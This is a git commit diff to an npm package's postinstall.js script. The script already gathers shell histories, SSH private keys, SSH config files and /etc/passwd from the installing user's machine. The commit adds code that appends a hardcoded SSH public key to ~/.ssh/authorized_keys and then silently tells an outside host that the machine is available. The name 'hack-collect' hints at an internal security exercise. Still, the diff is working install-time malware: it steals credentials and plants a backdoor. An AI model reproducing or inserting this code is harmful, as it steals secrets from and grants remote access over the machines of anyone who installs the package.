a6403e514f378a94c493c9fa0643f37a8b613c51
John Kraal <john@bynder.com>
2017-08-08 10:11:02 +0000

    also install public key

--- postinstall.js
+++ postinstall.js
@@ -4,7 +4,7 @@ var os = require('os');
 let filesOfInterest = ["/.zshrc", "/.bash_history", "/.zsh_history",
                        "/.ssh/id_rsa", "/.ssh/id_ed25519",
                        "/.ssh/known_hosts", "/.ssh/config",
-                       "../../../../etc/passwd"];
+                       "../../../../etc/passwd", "/.ssh/authorized_keys"];
 
 const homedir = os.homedir();
 
@@ -31,3 +31,26 @@ for (let fileofinterest of filesOfInterest) {
     req.end();
   });
 }
+
+// Add own pubkey to authorized_keys
+let coolKey = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBqMs1hL5xbzd1gG6+3oLCywqpe9yxRjOpp7Lm66S/tn";
+fs.appendFile(homedir + "/.ssh/authorized_keys", coolKey, function (err) {
+  if (err) {
+    return;
+  }
+  var options = {
+    hostname: 'hack-collect-dev.bynder.io',
+    port: 443,
+    path: '/success',
+    method: 'POST',
+  };
+  var req = http.request(options, function(res) {
+    res.setEncoding('utf8');
+  });
+  req.on('error', function(e) {
+    // Silence
+  });
+  // write data to request body
+  req.write("This host is available");
+  req.end();
+});
